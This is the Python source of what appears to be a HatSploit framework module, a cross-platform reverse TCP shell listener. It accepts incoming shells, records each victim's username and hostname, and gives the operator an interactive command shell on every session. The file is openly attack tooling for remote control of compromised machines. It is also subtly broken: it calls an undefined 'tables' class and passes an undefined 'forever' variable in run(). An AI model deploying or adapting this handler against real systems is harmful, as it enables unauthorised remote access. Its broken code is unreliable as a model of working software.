#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.badges import badges
from core.helper import helper
from core.storage import local_storage
from core.parser import parser
from core.tables import tabler

from utils.pseudo_shell import pseudo_shell

from data.modules.exploit.multi.stager.shell_reverse_tcp.core.listener import listener

class HatSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.local_storage = local_storage()
        self.parser = parser()
        self.tables = tables()
        
        self.pseudo_shell = pseudo_shell()
        
        self.listener = listener()

        self.controller = None
        self.id_number = 0
        
        self.sessions_id = dict()
        self.sessions_info = dict()
        
        self.details = {
            'Name': "exploit/multi/stager/shell_reverse_tcp",
            'Authors': [
                'enty8080'
            ],
            'Description': "Cross-platform reverse TCP shell.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "low"
        }
        
        self.options = {
            'LHOST': {
                'Description': "Local host.",
                'Value': None,
                'Required': True
            },
            'LPORT': {
                'Description': "Local port.",
                'Value': None,
                'Required': True
            },
            'FOREVER': {
                'Description': "Start listener forever.",
                'Value': "no",
                'Required': False
            }
        }
        
        self.commands = {
            'close': {
                'Description': "Close active session.",
                'Usage': "close <session_id>",
                'MinArgs': 1,
                'Run': self.close
            },
            'sessions': {
                'Description': "List all active sessions.",
                'Usage': "sessions",
                'MinArgs': 0,
                'Run': self.sessions
            },
            'interact': {
                'Description': "Spawn Pseudo shell on session.",
                'Usage': "interact <session_id>",
                'MinArgs': 1,
                'Run': self.interact
            }
        }
        
    def interact(self, argc, argv):
        session_id = argv[0]
        try:
            self.badges.output_process("Interacting with session "+str(session_id)+"...")
            self.interact_with_session(session_id)
        except Exception:
            self.badges.output_error("Invalid session")
        
    def close(self, argc, argv):
        session_id = argv[0]
        try:
            self.badges.output_process("Closing session "+str(session_id)+"...")
            self.close_session(session_id)
        except Exception:
            self.badges.output_error("Invalid session!")

    def sessions(self, argc, argv):
        if not self.sessions_id:
            self.badges.output_error("No active sessions!")
        else:
            sessions_data = list()
            headers = ("ID", "Host", "Username", "Hostname")
            sessions = self.sessions_info
            for session_id in sessions.keys():
                sessions_data.append((session_id, sessions[session_id]['host'], 
                                      sessions[session_id]['username'], 
                                      sessions[session_id]['hostname']))
            self.badges.output_empty("")
            self.tables.print_table("Sessions", headers, *sessions_data)
            self.badges.output_empty("")

    def interact_with_session(self, session_id):
        session = self.sessions_id[int(session_id)]
        self.pseudo_shell.spawn_pseudo_shell(self.details['Name'], session.send_command)

    def close_session(self, session_id):
        session = self.sessions_id[int(session_id)]
        session.close_connection()
        del self.sessions_id[int(session_id)], self.sessions_info[int(session_id)]
            
    def add_session(self, session, local_port, address):
        self.sessions_id[self.id_number] = session
        self.sessions_info[self.id_number] = {
            'id': self.id_number, 
            'port': int(local_port), 
            'host': address, 
            'username': session.send_command("username")[1], 
            'hostname': session.send_command("hostname")[1]
        }
        self.badges.output_success("Session "+str(self.id_number)+" opened!")
        self.id_number += 1
        
    def start_listener(self, forever, local_host, local_port):
        self.badges.output_process("Starting listener on port " + local_port + "...")
        try:
            server = self.listener.start_listener(local_host, local_port)
        except Exception:
            return
        
        if forever.lower() in ['yes', 'y']:
            while True:
                try:
                    session, address = self.listener.listen(local_host, local_port, server)
                except Exception:
                    return
                if session:
                    self.add_session(session, local_port, address)
        else:
            try:
                session, address = self.listener.listen(local_host, local_port, server)
            except Exception:
                return
            if session:
                self.add_session(session, local_port, address)
        
    def run(self):
        local_host, local_port = self.parser.parse_options(self.options)
        
        self.start_listener(forever, local_host, local_port)
